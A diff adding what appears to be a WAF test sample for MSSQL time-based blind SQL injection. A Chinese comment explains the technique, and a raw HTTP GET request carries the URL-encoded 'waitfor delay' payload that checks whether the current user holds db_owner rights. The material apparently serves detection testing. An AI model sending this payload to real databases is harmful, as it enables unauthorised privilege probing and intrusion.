@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_延时注入-06506459
+# 攻击者基于延时查询，将"if(select IS_MEMBER('db_owner'))=1 waitfor delay'0:0:5'"语句注入到 SQL 查询参数中，利用函数waitfor delay来延长数据库处理时间，通过加载时间来对注入结果进行判定以逐步爆破当前用户是否是db_owner权限。
+GET /?id=1%3Bif%28select%20IS_MEMBER%28%27db_owner%27%29%29=1%20waitfor%20delay%270:0:5%27&bid=hd_tag_m8mv26m7 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26m7
+RM-PRO-Token: 67e6b4a3f63b65c0425461b37cac8811
+RM-PRO-Time: 1742808635459
+User-Agent: curl/7.83.1
+
